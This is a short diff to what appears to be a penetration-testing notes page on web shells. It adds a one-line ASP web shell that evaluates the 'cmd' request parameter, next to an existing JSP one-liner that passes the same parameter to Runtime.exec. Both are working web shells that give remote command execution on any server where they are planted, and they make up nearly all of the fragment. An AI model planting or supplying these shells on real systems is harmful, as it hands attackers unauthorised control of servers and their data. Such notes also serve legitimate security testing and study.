@@ -31,7 +31,10 @@ tags: [technique, other]
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 
-
+For `asp`
+```asp
+<% eval request("cmd") %>
+```
 
 ## Things to know
 - 
